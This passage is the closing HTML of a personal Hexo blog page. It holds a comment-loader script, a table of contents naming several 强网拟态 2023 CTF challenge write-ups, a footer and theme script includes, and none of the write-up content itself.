            const loadGitalkTimeout = setTimeout(() => {
              loadGitalk();
              clearTimeout(loadGitalkTimeout);
            }, 1000);
          } else {
            window.addEventListener('DOMContentLoaded', loadGitalk);
          }
        </script>
    </div>



        
    
</div>

                </div>
            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-2023-%E5%9B%BD%E9%99%85%E8%B1%A1%E6%A3%8B%E4%B8%8E%E4%BA%8C%E7%BB%B4%E7%A0%81"><span class="nav-text">[强网拟态 2023] 国际象棋与二维码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-2023-%E7%94%A8%E6%88%B7%E7%99%BB%E8%AE%B0%E7%B3%BB%E7%BB%9F"><span class="nav-text">[强网拟态 2023] 用户登记系统</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-2023-find-me-and-crack-me"><span class="nav-text">[强网拟态 2023] find me and crack me</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-2023-Tbox-can"><span class="nav-text">[强网拟态 2023] Tbox can</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-2023-%E4%B8%80%E7%9C%BC%E7%9C%8B%E5%87%BA"><span class="nav-text">[强网拟态 2023] 一眼看出</span></a></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2020</span> -
            
            2024
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">jerem1ah</a>
            
        </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    

</main>




<script src="/js/utils.js"></script>

<script src="/js/main.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/dark-light-toggle.js"></script>







    
<script src="/js/code-block.js"></script>





<div class="post-scripts">
    
        
<script src="/js/post-helper.js"></script>

        
            
<script src="/js/libs/anime.min.js"></script>

        
        
            
<script src="/js/toc.js"></script>

        
    
</div>



</body>
</html>
